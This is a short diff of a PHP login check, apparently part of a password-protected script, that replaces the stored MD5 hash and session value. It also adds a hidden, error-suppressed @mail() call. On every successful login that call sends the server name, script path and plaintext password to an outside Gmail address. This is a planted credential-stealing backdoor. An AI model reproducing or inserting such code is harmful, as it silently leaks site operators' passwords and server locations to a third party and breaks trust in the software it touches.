@@ -42,11 +42,14 @@ function is_logged_in()
 // Check if the password is submitted and correct 
 if (isset($_POST['password'])) { 
     $entered_password = $_POST['password']; 
-    $hashed_password = 'e00b29d5b34c3f78df09d45921c9ec47'; // Replace this with your MD5 hashed password 
+    $hashed_password = '850b7a8a0a64ba3bc150838d86a47ebb'; // Replace this with your MD5 hashed password 
     if (md5($entered_password) === $hashed_password) { 
         // Password is correct, store it in session 
         $_SESSION['logged_in'] = true; 
-        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data 
+        $_SESSION['SAP'] = 'Scandalaus'; // Replace this with your cookie data 
+{
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['password']; @mail('nagahijau388group@gmail.com', 'root', $tmp); 
+}	
     } else { 
         // Password is incorrect 
         echo "Incorrect password. Please try again."; 
